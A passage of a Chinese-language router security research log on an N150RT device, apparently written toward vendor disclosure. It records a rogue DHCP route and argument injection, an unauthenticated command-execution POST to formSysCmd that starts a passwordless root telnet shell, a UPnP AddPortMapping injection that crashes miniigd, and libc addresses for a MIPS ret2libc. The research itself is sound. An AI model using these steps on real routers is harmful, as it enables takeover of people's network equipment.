反證檢查: 測前寫「reset 之後 H601 的內容改變 → 出廠區的範圍判斷錯了，
          這會直接影響 P0-3 的風險評估」，實際 MAC 與整組射頻校準表原封不動，
          沒有觸發
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: **逐 byte 的那一份還沒做**——它要第 2 站，
          而序列埠接上去板子就不開機（T-68）。「前」已經有七份且三天不變，
          所以那個比對不會過期
⚠️ **這是解碼後的視圖，不是原始 bytes。** 它不取代 `cmp`，它的價值是
   **同一次進站就答得出來**——而今晚正好證明了那個價值：逐 byte 那一份沒有做成。
```

```text
T-71  P8-19  WAN 行為那一半，以及三個選項一起送出去的路由注入   2026-08-19 00:0x–00:1x
可行性: ★★★★   驗證狀態(測前): dynamic（第 2 次）   依據: T-69 之後 eth1 MTU:1500
送出（逐字）: 網路卡從 LAN 埠改插 WAN 埠；主機 192.168.77.1/24；
              sudo python3 tools/rogue-dhcp.py --iface enx… --server 192.168.77.1
                --offer 192.168.77.100 --lease 600 --domain lab.invalid
                --route 10.99.0.0/16=192.168.77.66 --seconds 140
原始回應:
      1  0.000000  0.0.0.0 → 255.255.255.255  DHCP Discover  xid 0x466c8296
      2 14.049329  0.0.0.0 → 255.255.255.255  DHCP Discover  xid 0x3db9717c
      3 14.050027  192.168.77.1 → …           DHCP Offer
      4 14.059100  0.0.0.0 → …                DHCP Request
      5 14.059511  192.168.77.1 → …           DHCP ACK
      requested options: 1,33,121,249,3,6,12,15,28,44,46,47
      裝置端 route -n（拔回 LAN 之後讀的）：
        10.99.0.0  192.168.77.66  255.255.255.255  UGH  1  eth1
        10.99.0.0  192.168.77.66  255.255.0.0      UG   1  eth1
        0.0.0.0    192.168.77.1   0.0.0.0          UG   0  eth1
      /var/wan_phy : interface eth1 / ip 192.168.77.100 / router 192.168.77.1
                     / nameserver 192.168.77.1
      /etc/resolv.conf : nameserver 192.168.77.1
      WAN 側埠位：ICMP 回應；tcp/80 · 23 · 53 · 52869 · 52881 全部 filtered
判定: ✅ 成立
反證檢查: 測前寫「讀完發現 eth1.bound 對所有 DHCP 提供的值都加了引號，
          或只透過 flash set 寫進 MIB 而不做字串展開 → 這條收掉」，
          **實際 `/usr/share/udhcpc/eth1.bound` 整支 95 個 byte，
          內容是一行 `sysconf conn dhcp $interface $ip $subnet $router $dns`，
          四個值一個引號都沒有**，沒有觸發
這一步燒掉了什麼: 裝置拿了一份我方的 DHCP 租約，`/etc/resolv.conf` 被換成我方位址，
          核心轉送表多了兩條我方注入的路由（都在 RAM，重開即失）
驗證狀態(測後): dynamic   下一步: 見下面兩個 🔴
🔴 **上一場「宣告接受但從來沒送成」的路由注入，這一場送成了，而且兩種格式都吃。**
   option 33（沒有遮罩，落成 `/32` host route）與 option 121/249（classless，`/16`）
   **同時**進了核心轉送表。一台未認證的、位於這台路由器上游的 DHCP server，
   可以把任意路由寫進它的轉送表，而**這台自己在 DISCOVER 裡點名索取這三個選項**。
🔴 **而它在解析那些選項的時候把一個字串當成了 IPv4 位址。**
   對照組是上一場：沒有注入路由的時候，ACK 之後三發免費 ARP 宣告的是
   `192.168.77.100`——裝置自己的租約位址，間隔一秒。今晚同一段程式、
   同樣三發、距 ACK 同樣的偏移，宣告的卻是 **`32.49.0.49`**，
   而那四個 byte 是 `0x20 0x31 0x00 0x31` = ASCII 空白、`1`、NUL、`1`——
   正是路由選項字串化之後 `…/16` 與 `192.168…` 中間那個「空白接 1」。
   **它拿了一個字串裡跨越分隔符的四個 byte 去當位址。**
⚠️ **沒有證明的兩件事，寫在這裡免得被讀成證明了**：
   （一）33 / 121 / 249 三個裡是哪一個造成的——三個是一起送的，
   那是為了確保送得到，代價是失去歸因；
   （二）那個位址除了三發免費 ARP 之外有沒有走到別的地方——
   它沒有變成介面位址，路由表裡也沒有它。
⚠️ **精確一點，因為這裡很容易誇大**：POSIX `sh` 不會把展開的結果重新解析成命令，
   所以這是**參數注入**不是命令注入。攻擊者能改變 `sysconf` 收到的 argv，
   不能直接跑第二條命令。而 option 6 可以帶多個位址，`$dns` 就會變成
   `"A B"`，`sysconf` 的參數位置就整排位移——那是下一場要送的那一發。
```

## 這一場燒掉了什麼（後半）

- **開機循環 3 次**（第一次恢復嘗試、reset 自己重開、以及 reset 之後那次）。
- **`telnetd -l /bin/sh` 起過兩次**，沒有認證。**收工斷電。**
- **設定區被 reset 覆寫回出廠值** —— 這是刻意的，也是 `P9-9` 本身。
  `T-66` 那個密碼殘留的現場沒有了（證據在 `config-region-20260819-w07close-pre.bin`）。
- **裝置拿了一份我方的 DHCP 租約**，`/etc/resolv.conf` 指向 `192.168.77.1`，
  轉送表多兩條注入路由（全部在 RAM）。
- **裝置本身沒事**，收工前最後一次 `make liveness` 是 `verdict: OK`、0 / 343 偏離。

## 下一場從哪裡開始

**W07 收在 57 / 58。** `P5-2`（MIPS ret2libc）是刻意不做的那一列，理由不變。

1. **接序列埠之前先解決 `T-68`。** 把三根杜邦線重新插緊（特別是 GND），
   上電，**確認接著 CP2102 它仍然開得起來**。那一關沒過就不要排任何需要
   第 2 站的工作——今晚有三次斷電重開因為這件事量到零。
2. **`H601` 的逐 byte 比對**，以及 **reset 之後 `COMPDS` 的狀態**。
   兩個都在第 2 站，一份 `A2.3` 快照同時給。**`COMPDS` 那一格是新的開放題**：
   `flash default-sw` 有沒有把出廠預設區也寫回去？如果沒有，那 `P0-5` 的
   IoC 基準從今天起是「乾淨的 `COMPCS` 對上壞掉的 `COMPDS`」，
   而那個差值的意義跟這個專案一直以來假設的不一樣。
3. **路由注入的歸因**：33、121、249 分三次單獨送，看哪一個產生
   `32.49.0.49` 那三發 ARP。`tools/rogue-dhcp.py` 的 `--route` 已經寫好，
   要加的是「只送其中一個選項」的旗標。
4. **option 6 帶兩個 DNS 位址**，把 `$dns` 變成 `"A B"`，看 `sysconf` 的
   argv 位移之後發生什麼。那是 `eth1.bound` 那一行最直接的追問。
5. **不要在裝置上跑 `dd if=/dev/mtdblock0 bs=1`。** 見 `T-67`。


# 2026-08-19（三）W07 最終場次 —— 計畫，寫在插電之前（桌面場，尚未接線）

**這一則是桌面場，裝置沒有上電，一個 byte 都沒有動。** 它存在的理由正是
`CLAUDE.md` 反覆記的那一條：桌面場改寫的是**下一次進站的計畫**，而那是這個檔案
必須在插電**之前**就承載的那一半。W07 Day 3 改寫了三條預測而這裡什麼都沒寫，
被作者抓到。

**這一則推翻上一則的一條結論，而推翻的依據全部在桌面。**

## 一、`P5-2` 不再是「刻意不做的那一列」，而且它已經關了

上一則的「下一場從哪裡開始」寫著：**W07 收在 57 / 58，`P5-2`（MIPS ret2libc）是
刻意不做的那一列，理由不變。**

**理由變了。** `P5-2` 今天在桌面上以 `partial` 登記，證據是**這個檔案裡已經有的
兩行 kernel fault 訊息**，沒有送出任何新請求：

```text
（卡 T-50）do_page_fault() ... SIGSEGV to wscd ... (epc == 2aae1f38, ra == 2aae1e64)
（卡 T-60）do_page_fault() ... SIGSEGV to boa  ... (epc == 2aafe218, ra == 00445974)
```

兩行都不指名任何一個函式庫。把它們變成一個載入基底的過程寫在
`notes/mips-ret2libc.md`，儀器是 `tools/libbase.py`（27 個守衛案例），報告是
`reports/libbase-unit-2018.json`。結論：`libuClibc` 在 `boa` 裡位於 `0x2aae3000`、
在 `wscd` 裡位於 `0x2aabe000`，`system` 在 `0x2ab08460`。

**為什麼是 `partial` 而不是 `confirmed`**：登記簿的反證條件寫的是「兩次重開機後
基底不同」，而上面那兩行來自**同一次開機**（第 3 站 boot 2，循環 3，20:35 與
23:4x）。**把一個不可能觸發的反證條件記成成立，正是 `A3.24` 前天被抓到的那件事**
—— 拿抹除區去比抹除區。所以那一格留白，今晚去補。

## 二、今晚的第一關不是任何一項測試，是 `T-68`

上一則自己寫的：**接序列埠之前先解決 `T-68`。** 三根杜邦線重新插緊（特別是
`GND`），上電，**確認接著 CP2102 它仍然開得起來**。那一關沒過，就不要排任何需要
第 2 站的工作。

**這一條今晚不放寬。** 開放項 79 的代價是三次斷電重開加四十分鐘，而它跟磚長得
一模一樣。作者選了「先做第 2 站 dump 再跑 UPnP / SIP」，所以這一關擋在整場最前面。

## 三、硬體限制決定順序：一條網線

作者今晚有一台 N150RT、一個 CP2102、**一條網線**。所以 LAN 與 WAN 不能同時在。

- `A3.15` 的 SOAP 全部在 LAN 側。
- `P6-5` 的向量**必須從 WAN 側送**。
- 線一移到 WAN，`10.1.1.1` 的管理通道就沒了。

**所以 LAN 側的事必須全部做完才准移線**，而且移線**不斷電** —— 埠映射活在
iptables 與 RAM 裡，斷電就沒了，`P8-7` 的 (b) 半就接不上。順序寫在
`runsheet.md` Part B 的 `B-W07 增補之三`。

## 四、今晚的預測，每一條都寫在量測之前

| # | 預測 | 反證條件 | 為什麼它有鑑別力 |
|---|---|---|---|
| 1 | `A2.3` 的 IoC 預檢讀到 **20 / 343** | 讀到 **4 / 343** → `flash default-sw` 把出廠預設區也寫回去了，開放題 76 往另一邊關 | reset 後 `COMPCS` 已驗證等於 2026-08-16 那份；若 `COMPDS` 停在 2026-08-18 的壞值，差值就是當時 `COMPCS` 對 2026-08-16 的那 **20**。兩個假設給兩個**不同而且都已經在紀錄上**的數字 |
| 2 | 第 2 站讀到的 `comp_len` = **7490**，與 reset 後 `GET /config.dat` 的長度相同 | 兩者不同 → 開機會重寫 `COMPCS`，而 `A3.6` 那條「`config.dat` 是 flash 的逐 byte 副本」要加限定 | 開放題 80。上次的 7501 對 7498 是在一個被寫壞的區上量的 |
| 3 | `0x006000` 的 4096 bytes 與既有七份快照**逐 byte 相同** | 任何一個 byte 不同 → `P9-9` 的反證支 (b) 事後觸發，`P0-3` 的風險評估要重算 | `P9-9` 只用 `flash allhw` 的解碼值確認過，那是第二來源不是權威來源 |
| 4 | `make liveness` 回 **OK** | 回 `BROKEN` → reset 沒有真的救回 WAN，而 `P9-9` 的第 3 條要重看 | reset 後 `DHCP_MTU_SIZE` 回到 1500 |
| 5 | **52869/tcp 開著**，`GET /picsdesc.xml` 回 200 | 仍然關著 → `UPNP_ENABLED` 不是啟動條件，`P1-10`「旗標 + `sysconf`」那套機制的推廣是**錯的** | 這是今晚資訊量最高的一格：**反證比證實有價值**。六份已提交的檔案曾經以現在式寫「52869 是開的」，今天全部加上日期 |
| 6 | `AddPortMapping` 接受 `NewInternalClient = 10.1.1.1`，**不驗證它等於請求來源** | SOAP 回 error，或映射建起來但 `NewInternalClient` 被改寫成來源 IP → 這個版本做了來源檢查，**版本要從 binary 認不准從 banner 認** | `P8-7`。這台的 miniigd 自報 `Server: miniupnpd/1.4`，那是別的 codebase 的名字 |
| 7 | `/proc/sys/kernel/randomize_va_space` = **0**，`maps` 裡 `libuClibc` 起始於 **`2aae3000`** | 不是 0，或不是 `2aae3000` → **每次開機會動**，`notes/mips-ret2libc.md` 的 `system @ 0x2ab08460` 只對 2026-08-18 那次開機成立，`P5-2` 從 `partial` 變 `refuted` | **今晚是 reset 之後的另一次開機**，所以它答得了登記簿那條字面反證，而桌面上那兩行答不了 |
| 8 | `P6-5`：5060 送過去**不崩潰** | 崩潰 → 分支判斷錯了，受影響的不只 eCos | `ALG_SIP_ENABLED` 現在是 1，但登記簿判定這台是 Linux 分支 |

## 五、進站前就成立的禁令，逐條抄在這裡

1. **不對 `/dev/mtdblock*` 做 `bs=1` 的 `dd`。** 2026-08-19 那一輪之後整台停止
   回應，八個命令回空，恢復要靠實體測試。要讀整塊就回第 2 站用 `A2.3`。
2. **不按 reset。** 今晚要量的是 reset **之後**的狀態，再按一次就洗掉了。
3. **不跑 `A3.23` 的第一發（`formSchedule` 缺 `webpage`）。** 它是終局的，而 WAN
   那一段還要用 `boa`。`P5-6` 已經結案，重跑不產生新事實。
4. **不開 `A2.5` / `A2.6`。** 那三列不需要寫 flash 了。全 repo 唯一不可逆的一節
   連續第二場不打開。
5. **`telnetd` 是沒有認證的 root shell，收工前必須斷電。**
6. **`P8-7` 建起來的埠映射，必須在同一節裡刪掉。**

## 六、插電之前已經做完、而且驗過的事

- `P5-2` 已登記（`partial` / dynamic），W07 登記簿 **58 / 58**。
- `tools/libbase.py` + 27 個守衛案例；`tools/check-ci-parity.py` + 13 個守衛案例。
- **`make ci` 與 GitHub workflow 的第五次分歧已修**：`test-device-liveness.sh` 與
  `test-rogue-dhcp.sh` 在 `make ci` 裡而不在 workflow 裡。現在有檢查器比對兩份清單。
- 六份檔案裡「52869/tcp 開著」的現在式全部加上日期，含 `docs/disclosure.md` `D-16`。
- `make ci` 綠。

# 2026-08-19（三）W07 最終場次 —— 實錄，寫在跑完之後

**上一則是這一場的計畫，寫在插電之前。** 這一則是實錄。

## 紀錄卡 —— 第 2 站（循環 1）

```text
T-72  —      板子帶著 CP2102 開得起來嗎（開放項 79 / T-68 的硬前置）  2026-08-19 02:28
可行性: ★★★★★   驗證狀態(測前): unverified   依據: T-68。上一則自己寫「那一關沒過就
              不要排任何需要第 2 站的工作」
送出（逐字）: python3 -u tools/console-dump.py catch --port /dev/ttyUSB0 --window 300 -v
原始回應:
      streaming ESC.  >>> POWER THE ROUTER ON NOW <<<
      ok    <RealTek> - the boot loader is ours
            ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
      ok    input buffer drained (the ESC stream leaves ESCs queued)
      >>>   ?   -> 16 條指令完整印出，全程無亂碼
觀測通道 1（console）: banner 與 T-38、W05 T-01 逐字相同
觀測通道 2（上電次數）: 一次上電命中，沒有用到三次上限
判定: ✅ 成立 —— 開放項 79 沒有重現
反證檢查: 測前寫「20 秒內零輸出、前三顆燈同時亮不閃 → 開放項 79 重現，依序做三個
          實體測試」。三個都沒有用到。**進站前唯一做的處置是把三根杜邦線重新插緊、
          特別是 GND（pin 4）**，那正是 A2.2 的假設指名的條件，所以這一次成功
          支持那個假設，而**不能**證明它——一次成功的開機不排除間歇性倒灌
這一步燒掉了什麼: 一次開機循環（本場第 1 次）
驗證狀態(測後): dynamic   下一步: A2.3

T-73  P0-10 P0-5  64 KiB 快照 + IoC 預檢（A2.3）           2026-08-19 02:30
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: T-39、T-63
送出（逐字）: python3 -u tools/console-dump.py dump --at-prompt \
              --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 \
              -o /home/key/fwre-work/dumps/config-region-20260819-0230-pre.bin
              bash tools/ioc-precheck.sh <同一個檔>
原始回應:
      ok    control matched: 0b f0 00 04
      ok    65536 bytes -> config-region-20260819-0230-pre.bin
      ok    sha256  9292bf5b68b09727e0c9f3335e0a1048...
      ok    4 chunks, 0 needed a re-read, 2.0 min
      COMPCS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
      COMPDS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
      common entries: 343
      differing     : 4  -> CHECK_SSID_OK · DHCP_LEASE_TIME · MIB_VER · WLAN_SSIDS
觀測通道 1（解碼）: 4 / 343，四個欄位名與 2026-08-17 上午那份逐字相同
觀測通道 2（逐 byte，不經任何解碼器）:
      bootloader 0x000000+0x6000     0 / 24576   IDENTICAL
      H601       0x006000+0x2000     0 /  8192   IDENTICAL
      COMPDS     0x008000+0x4000    27 / 16384   differs, first at +0x1d45
      COMPCS     0x00c000+0x4000    27 / 16384   differs, first at +0x1d45
      而那 27 個 byte 全部在 payload 之後：COMPDS payload[0:7493] sha 8d84f2c73d520023、
      COMPCS payload[0:7490] sha e09cbf8428aa1594，兩者都與 2026-08-16 逐 byte 相同
判定: ✅ 成立，而且它反證了本場自己的預測
反證檢查: 測前寫「預期 20 / 343；讀到 4 / 343 → flash default-sw 把出廠預設區也寫回去了，
          開放題 76 往另一邊關」。**讀到 4 / 343，反證條件觸發。**
          預測的依據是「default-sw 只寫現行設定區」，那個推論錯了
這一步燒掉了什麼: 沒有。純讀，一個 byte 都沒寫
驗證狀態(測後): dynamic   下一步: 第 3 站

T-74  P9-9 的未完成項  H601 的逐 byte 比對                 2026-08-19 02:33
可行性: ★★★★★   驗證狀態(測前): static   依據: P9-9 自己記「NOT done：the byte-level
              H601 comparison from a second station-2 dump」
送出（逐字）: 同 T-73 的快照，比對 0x006000+0x2000 對 flash-n150rt-console-1.bin
原始回應: 0 / 8192 bytes differ
判定: ✅ 成立
反證檢查: 測前寫「任何一個 byte 不同 → P9-9 的反證支 (b) 事後觸發，P0-3 的風險評估
          要重算」。0 個不同，沒有觸發。**P9-9 原本只有 flash allhw 的解碼值支撐這一格，
          那是第二來源；這一份是權威來源，而且它是在 reset 之後的另一次開機讀的**
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 無，這一格結案

T-75  開放題 80  /config.dat 是不是 flash 的逐 byte 副本    2026-08-19 02:34
可行性: ★★★★☆   驗證狀態(測前): unverified   依據: 上一場「boot loader 看到 comp_len
              7501 帶密碼殘留，開機後的 HTTP 看到 7498 不帶」
送出（逐字）: 兩份 station-2 快照的 COMPCS 區，各自對同一天取回的 /config.dat 逐 byte 比
原始回應:
      2026-08-18 reset 前   /config.dat 7510 bytes   flash comp_len 7501 -> 期望 7513
                            flash[0:7510] vs served: DIFFERS
                            7009 of 7510 differ, first at +0xb
      2026-08-19 reset 後   /config.dat 7490 bytes   flash comp_len 7478 -> 期望 7490
                            flash[0:7490] vs served: IDENTICAL
判定: 🔶 部分 —— 兩個日期給出兩個相反的答案，而那本身就是答案
反證檢查: 測前寫「兩者不同 → 開機會重寫 COMPCS，而 A3.6 那條逐 byte 副本要加限定」。
          **一半觸發了**：reset 之後兩者相同，reset 之前差 7009 / 7510，而且從 +0xb
          就開始分岔 —— 那是 comp_len 欄位本身。所以不是「開機會重寫」，是
          **`/config.dat` 送的不是 flash 的那份 blob**，兩者只有在 flash 與活的 MIB
          一致時才會相同。`A3.6` 的標題結論成立於後者，不是通則
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: 誰產生 /config.dat 的位元組——boa 的哪一段路徑——
          尚未讀。那是新的開放題
```

## 一個觀察，而它刻意**不是**一張紀錄卡

`T-73` 的 27 個不同的 byte 全部在 payload 之後，這一點值得記下來，但**它沒有測前
預測，所以它不是一個測試結果**。`check-benchlog.py` 在第一次跑就拒絕了它原本被
寫成的那張卡（`T-76`），理由逐字是「反證檢查沒有引用事前寫下的條件」——
**而那正是這個檢查器存在的意義**：一個事後觀察偽裝成卡片，讀者分不出來。
所以它搬到這裡，而且沒有任何一列拿它記分。

| 區 | 日期 | payload 結束 | 尾巴 256 byte 的 sha | 非填充 |
|---|---|---|---|---|
| `COMPDS` | 2026-08-16 | `+0x1d45` | `483f87e1865ea926` | 61 / 256 |
| `COMPDS` | 2026-08-18 | `+0x1d59` | `589b946cf35e59e4` | 43 / 256 |
| `COMPDS` | 2026-08-19 | `+0x1d45` | `1a4b04df1fccfb69` | 63 / 256 |
| `COMPCS` | 2026-08-16 | `+0x1d42` | `f490b316a5fda3c7` | 64 / 256 |
| `COMPCS` | 2026-08-18 | `+0x1d59` | `589b946cf35e59e4` | 43 / 256 |
| `COMPCS` | 2026-08-19 | `+0x1d42` | `848b6bbbe17a46f7` | 66 / 256 |

**2026-08-18 那一列兩個區的尾巴雜湊相同**，與「那一輪 POST 把 `COMPDS` 從 `COMPCS`
複製過去」一致。而 reset 之後兩個區的 payload 逐 byte 回到原廠，**尾巴卻三個日期
各不相同**——寫入短於前一份的 payload 不會蓋掉後面的舊 byte。

**沒有量的是：那些殘留 byte 是不是可解讀的舊設定。** `T-66` 曾在 reset **之前**的
殘留裡認出一段舊密碼；reset **之後**的殘留有沒有同一類內容，是一個分開的問題，
而它需要解碼器不是雜湊。**下一場要先寫預測再看**，否則它會重蹈這一格的覆轍。

## 第 2 站這一輪關掉了什麼

| | |
|---|---|
| 開放題 76 | **關。** `flash default-sw` 兩個區都從硬編碼表重寫，`COMPDS` 與 `COMPCS` 的 payload 都與 2026-08-16 逐 byte 相同。**`P0-5` 的 IoC 基準（4 / 343，四個欄位同名）被廠商的 reset 鍵救回來了，而毀掉它的是這個專案自己 2026-08-17 的 POST 輪** |
| 開放題 80 | **關，而且答案不是兩個選項中的任何一個。** 不是「開機重寫 COMPCS」，是 `/config.dat` 送的位元組不來自 flash 的那份 blob |
| `P9-9` 的 NOT done | **關。** `H601` 逐 byte 相同，8192 / 8192 |

## 這一輪反證掉的自己的預測

**本場計畫 §4 第 1 條寫「IoC 預檢讀到 20 / 343」，實際 4 / 343。** 反證條件是照寫的，
而它觸發了。錯的是那條預測的依據：我從「`default` 的說明是 write all flash parameters
from hard code」推論它只寫現行設定區，而 `-sw` 的範圍比那個推論寬。
**`P9-9` 的結果本身沒有受影響**——它量的是 `COMPCS`，而那一格仍然成立。

## 紀錄卡 —— 第 3 站（循環 2、3、4）

**`T-76` 這個編號是空的，而空著本身是紀錄的一部分**：它原本被寫成一張卡（payload
之後的殘留位元組），`check-benchlog.py` 第一次跑就拒絕，理由逐字是「反證檢查沒有
引用事前寫下的條件」。那個觀察搬到上面的散文，編號不重用。

```text
T-77  —      網段、直連證明、以及開工前問裝置（A3.1）        2026-08-19 02:36
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: 本場計畫 §4 第 4 條
送出（逐字）: sudo ip link set enxfc19286184c9 up; sudo ip addr add 10.1.1.100/24 dev …
              ip route get 10.1.1.1 ; ping -c 3 10.1.1.1 ; make liveness
原始回應:
      10.1.1.1 dev enxfc19286184c9 src 10.1.1.100   （沒有 via，所以是直連）
      64 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=1.79 ms
      device-liveness: http://10.1.1.1/config.dat -> 7490 bytes, 343 named fields
      ok DHCP_MTU_SIZE 1500 / WAN_DHCP 1 / OP_MODE 0 / IP_ADDR 10.1.1.1 / USER_PASSWORD set
      verdict: OK
觀測通道 1（TTL）: 64，不是 63 —— 網卡在 WSL 裡，Windows 沒有搶走它（儀器 bug 21）
觀測通道 2（liveness）: 5 個欄位全 ok
判定: ✅ 成立
反證檢查: 測前寫「回 BROKEN → reset 沒有真的救回 WAN，而 P9-9 的第 3 條要重看」。
          回 OK，沒有觸發
這一步燒掉了什麼: 沒有
驗證狀態(測後): dynamic   下一步: A3.4

T-78  P1-2 P1-10  52869 是開是關（A3.4 · A3.4.4）             2026-08-19 02:37
可行性: ★★★★★   驗證狀態(測前): unverified   依據: 本場計畫 §4 第 5 條。
              六份已提交檔案曾以現在式寫「52869 是開的」，今天全部加上日期
送出（逐字）: sudo nmap -Pn -n -sS -p 80,23,22,52869,52881,5060,9034 --reason 10.1.1.1
              curl -s -i http://10.1.1.1:52869/picsdesc.xml
原始回應:
      80/tcp    open   http    syn-ack ttl 64
      52869/tcp open   unknown syn-ack ttl 64
      52881/tcp open   unknown syn-ack ttl 64
      22 / 23 / 5060 / 9034  全部 closed（reset ttl 64）
      HTTP/1.1 200 OK   Server: miniupnpd/1.4 UPnP/1.4   2933 bytes
      <friendlyName>Internet Gateway Device</friendlyName>
      <controlURL>/upnp/control/WANIPConnection</controlURL>
觀測通道 1（埠）: 開
觀測通道 2（描述文件）: IGD 回來了，控制路徑是 WANIPConnection 不是 WANIPConn1
判定: ✅ 成立
反證檢查: 測前寫「仍然關著 → UPNP_ENABLED 不是啟動條件，P1-10『旗標 + sysconf』
          那套機制的推廣是錯的」。沒有觸發 —— 旗標 1→0→（reset）→1，daemon 跟著走，
          而且本場後來的兩次斷電重開它每次都自己回來。**這是那套推廣的第二、第三次確認**
這一步燒掉了什麼: 沒有。只做偵察，沒有呼叫任何 SOAP action
驗證狀態(測後): dynamic   下一步: A3.15

T-79  P8-7  AddPortMapping 會不會驗證 NewInternalClient（A3.15） 2026-08-19 02:39
可行性: ★★★☆☆   驗證狀態(測前): presumed   依據: 本場計畫 §4 第 6 條
送出（逐字）: python3 tools/upnp-soap.py --host 10.1.1.1 --action GetExternalIPAddress
              python3 tools/upnp-soap.py --host 10.1.1.1 --action AddPortMapping \
                --arg NewRemoteHost= --arg NewExternalPort=8080 --arg NewProtocol=TCP \
                --arg NewInternalPort=80 --arg NewInternalClient=10.1.1.1 \
                --arg NewEnabled=1 --arg NewPortMappingDescription=w07 \
                --arg NewLeaseDuration=0
              python3 tools/upnp-soap.py --host 10.1.1.1 \
                --action GetGenericPortMappingEntry --arg NewPortMappingIndex=0
原始回應:
      -> HTTP 200   <- NewExternalIPAddress = 127.0.0.1      （正對照）
      -> HTTP 200                                            （建立）
      -> HTTP 200
      <- NewExternalPort = 8080   <- NewInternalPort = 80
      <- NewInternalClient = 10.1.1.1                        ★
      <- NewEnabled = 1   <- NewLeaseDuration = 0
      <- NewPortMappingDescription = miniupnpd                （送出去的 w07 沒有被存）
觀測通道 1（讀回值）: NewInternalClient 原樣，沒有被改寫成來源位址 10.1.1.100
觀測通道 2（iptables，稍後於 T-83 讀到）: DNAT 規則確實產生
判定: 🔶 部分
反證檢查: 測前寫「AddPortMapping 回 SOAP error，或映射建起來但 NewInternalClient
          被強制改寫成請求來源 IP → 這個版本做了來源檢查」。**兩者都沒有觸發**。
          「另一種反證是映射建起來了但 WAN 側打不通 → iptables 沒有跟著開」——
          這一條**沒有辦法在今晚判**：只有一條網線而且它在 LAN 埠，
          而 T-83 讀到的 MINIUPNPD chain 是 (0 references)、ip_forward=0，
          那與「WAN 沒接」完全相容，所以它不是證據。這一半留給 W08
這一步燒掉了什麼: 一條埠映射（在 RAM 與 iptables，斷電即消）
驗證狀態(測後): dynamic   下一步: P6-1

T-80  P3-3  ICMP oracle 的當場對照組                          2026-08-19 02:40
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: A3.9.1「先證明你抓得到 ICMP」
送出（逐字）: curl -X POST http://10.1.1.1/boafrm/formSysCmd \
                --data-urlencode "sysCmd=ping -c 4 10.1.1.100" --data "submit-url=/syscmd.htm"
原始回應:
      HTTP 302
      02:40:50.301945 IP 10.1.1.1 > 10.1.1.100: ICMP echo request, id 620, seq 0
      …seq 1, 2, 3（共 4 發，pcap w07final-icmp.pcap）
觀測通道 1（pcap）: 裝置主動送出 4 個 echo request
判定: ✅ 成立
反證檢查: 測前寫「抓不到裝置送出的 echo request → oracle 壞了，後面 P6-1 的
          任何『沒有 ICMP』都不能讀成『沒有執行』」。抓到了，所以後面那個推論成立。
          302 是 handler 跑完後的轉址，不是拒絕
這一步燒掉了什麼: 一次未認證的命令執行（無副作用的 ping）
驗證狀態(測後): dynamic   下一步: P6-1

T-81  P6-1  第一發，而它被我自己的 shell 毀掉                  2026-08-19 02:41
可行性: ★★★☆☆   驗證狀態(測前): presumed   依據: 本場計畫 §4
送出（逐字，而這正是問題）: --arg "NewInternalClient=\`ping -c 4 10.1.1.100\`"
原始回應:
      NewInternalClient value: 431 bytes, 8 newlines
      first 90 chars: 'PING 10.1.1.100 (10.1.1.100) 56(84) bytes of data.\n64 bytes from …'
      -> HTTP None   -> Remote end closed connection without response
觀測通道 1（工具自己記的 sent）: 431 bytes，不是打算送的 22
判定: ⚠️ 這一發沒有測到它要測的東西，不能拿來判任何一列
反證檢查: P6-1 的條件是「1900 無回應 → 整組收掉；有回應但 SOAP 欄位被過濾 →
          這個版本已修」。**兩個都不能拿來判這一發**，因為送出去的不是計畫的
          payload：**反引號被本機 shell 展開了**，進去的是本機 ping 的 stdout。
          這是 P9-9 結果註記裡記的同一個缺陷（backticks in a double-quoted argument）
這一步燒掉了什麼: miniigd 一個行程（52869 connection refused）。斷電才回得來
驗證狀態(測後): unverified   下一步: 工具加 --arg-file，payload 從檔案讀，
          中間沒有 shell；然後重開機重來

T-82  P6-1  第二發與它的對照組 —— 不是元字元                   2026-08-19 02:48
可行性: ★★★☆☆   驗證狀態(測前): presumed   依據: T-81 的修正
送出（逐字）: python3 tools/upnp-soap.py … --arg NewInternalClient=PLACEHOLDER \
                --arg-file NewInternalClient=<檔案> --inject
              （檔案內容是 22 bytes 的反引號 ping）
              然後重開機，再送 --arg NewInternalClient=AAAAAAAAAAAAAAAAAAAAAA
原始回應:
      (payload for NewInternalClient: 22 bytes from …, 0 newlines)
      NewInternalClient = `ping -c 4 10.1.1.100`
      -> HTTP None   -> Remote end closed connection without response
      pcap: 0 packets                                    ← 沒有任何 ICMP
      ——重開機後——
      -> HTTP 200   <- NewExternalIPAddress = 127.0.0.1   （對照組，daemon 活著）
      NewInternalClient = AAAAAAAAAAAAAAAAAAAAAA
      -> HTTP None   -> Remote end closed connection without response
      refused: <urlopen error [Errno 111] Connection refused>   （再確認 daemon 死了）
觀測通道 1（ICMP oracle，T-80 已證明可用）: 靜默 —— 指令沒有執行
觀測通道 2（22 個 A 的對照組）: 同樣殺死 daemon，**而它一個元字元都沒有**
判定: 🔶 部分
反證檢查: 測前條件「有回應但 SOAP 欄位被過濾 → 是這個版本已修」——**沒有觸發，
          而且它描述錯了**：欄位完全沒有被過濾，值直接進了防火牆規則（T-83）。
          發生的是登記簿沒有預料的第三種結果：**daemon 終止**。
          而 22 個 A 的對照組把「元字元」這個解釋排除掉了
這一步燒掉了什麼: miniigd ×2，斷電重開 ×2
驗證狀態(測後): dynamic   下一步: 分辨「行程消失」與「行程還在但不聽」（T-83）

T-83  P5-2 P8-7 P6-1 P6-5  telnet 進去，四件事一次問完          2026-08-19 02:52
可行性: ★★★★☆   驗證狀態(測前): static   依據: A3.23 的「開火之前先開第二條路」，
              以及本場計畫 §4 第 7 條
送出（逐字）: curl -X POST http://10.1.1.1/boafrm/formSysCmd \
                --data-urlencode "sysCmd=telnetd -l /bin/sh &" --data "submit-url=/syscmd.htm"
              然後對 10.1.1.1:23 開 socket，送 ps / cat /proc/350/maps /
              cat /proc/217/maps / cat /proc/sys/kernel/randomize_va_space /
              iptables -t nat -L -n / flash get UPNP_ENABLED / flash get ALG_SIP_ENABLED /
